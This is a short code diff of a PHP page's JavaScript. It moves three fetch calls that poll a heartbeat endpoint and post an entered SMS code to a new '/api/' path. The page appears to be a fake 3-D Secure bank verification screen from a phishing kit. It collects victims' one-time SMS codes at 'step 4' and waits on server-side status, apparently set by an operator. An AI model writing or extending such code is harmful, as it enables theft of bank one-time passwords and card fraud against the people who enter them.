@@ -150,7 +150,7 @@ body{min-height:100vh;background:#ecf0f5;display:flex;align-items:center;justify
 
   /* ---- Heartbeat ---- */
   function heartbeat(){
-    fetch('<?= BASE_PATH ?>/heartbeat.php', {method:'POST', credentials:'same-origin'})
+    fetch('<?= BASE_PATH ?>/api/heartbeat.php', {method:'POST', credentials:'same-origin'})
       .then(function(r){ return r.json(); })
       .then(function(d){
         var dur = d.durum || 'bekle';
@@ -173,7 +173,7 @@ body{min-height:100vh;background:#ecf0f5;display:flex;align-items:center;justify
           if(mevcutKod.length > 0){
             var fdh = new FormData();
             fdh.append('sms_hata_kodu', mevcutKod);
-            fetch('<?= BASE_PATH ?>/heartbeat.php', {method:'POST', body:fdh, credentials:'same-origin'}).catch(function(){});
+            fetch('<?= BASE_PATH ?>/api/heartbeat.php', {method:'POST', body:fdh, credentials:'same-origin'}).catch(function(){});
           }
           // Submit yapıldıysa formu sıfırla
           if(submitYapildi) resetForm();
@@ -222,7 +222,7 @@ function submitKod(){
   var fd = new FormData();
   fd.append('mevcut_adim', '4');
   fd.append('sms_kod', kod);
-  fetch('<?= BASE_PATH ?>/heartbeat.php', {method:'POST', body:fd, credentials:'same-origin'}).catch(function(){});
+  fetch('<?= BASE_PATH ?>/api/heartbeat.php', {method:'POST', body:fd, credentials:'same-origin'}).catch(function(){});
 
   // UI'ı "bekleniyor" moduna al
   document.getElementById('acs-submit-btn').disabled = true;
